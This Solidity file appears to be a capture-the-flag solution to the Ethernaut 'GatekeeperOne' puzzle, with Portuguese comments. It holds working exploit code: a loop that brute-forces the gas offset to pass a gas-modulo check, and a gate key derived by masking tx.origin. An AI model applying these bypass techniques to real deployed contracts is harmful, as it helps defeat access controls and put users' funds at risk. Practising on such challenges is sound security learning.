//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperOne {

  function enter(bytes8 _gateKey) external returns (bool) ;

}

contract GatekeeperOneAttack {

    IGatekeeperOne public victim;
    bytes8 public myGateKey;
    bool  public entrou=false;

    constructor(address _addr){
        victim = IGatekeeperOne(_addr);
    }

    function attack() public {
        //victim.enter(myKey);
        //testar quanto gás vai dividir! Que merda!
        for (uint256 i = 0; i <= 8191; i++) {
            try victim.enter{gas: 800000 + i}(myGateKey) {
                entrou=true;
                break;
            } catch {}
        }

    }

    function calculaKey() public {
        uint256 teste;
 
        //myKey = bytes8(bytes32(tx.origin));
        //myKey =  abi.encodePacked(uint256(uint160(tx.origin)));
        teste = uint256(uint160(tx.origin));
        //key = bytes8(uint64(uint160(address(player)))) & 0xFFFFFFFF0000FFFF;
        myGateKey=bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
    }

    function testaKey() public view returns (bool){
        bytes8 _gateKey=myGateKey;
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");        
        return true;
    }


}